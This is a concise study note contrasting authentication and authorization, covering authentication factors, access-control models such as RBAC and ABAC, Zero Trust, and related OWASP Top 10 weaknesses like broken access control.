Authentication vs Authorization (AuthN vs AuthZ): Authentication (AuthN): who are you? Verify identity; proves claimant is who they say they are. Methods: something you know (password, PIN); something you have (OTP token, hardware key, smart card); something you are (biometric -- fingerprint, face); multi-factor (MFA) combines two or more factors. Examples: login with username/password; certificate-based authentication; SAML/OAuth SSO. Authorization (AuthZ): what are you allowed to do? Controls access to resources based on authenticated identity; happens AFTER authentication. Models: DAC (Discretionary Access Control): resource owner controls access; standard file system permissions. MAC (Mandatory Access Control): system enforces labels (Top Secret, Secret, Confidential); Bell-LaPadula model; military systems. RBAC (Role-Based Access Control): permissions assigned to roles; users assigned roles; most common in enterprise applications (admin role, read-only role). ABAC (Attribute-Based Access Control): policies based on user attributes, resource attributes, environment; fine-grained; (User.department = Finance AND Resource.classification = Internal AND Time = BusinessHours). Zero Trust: never trust, always verify; both authentication AND authorization required for every access attempt; continuous verification. Common vulnerabilities: Broken Authentication: bypass authentication; Broken Access Control (IDOR, privilege escalation): authentication succeeded but authorization failed; user accesses resources they are authenticated for but not authorized for. Web applications: session token proves authentication; subsequent authorization checks must verify that authenticated user has permission for each action (not just that they are logged in). OWASP Top 10: A01 2021 Broken Access Control, A07 Identification and Authentication Failures -- both in top 10 reflecting importance.
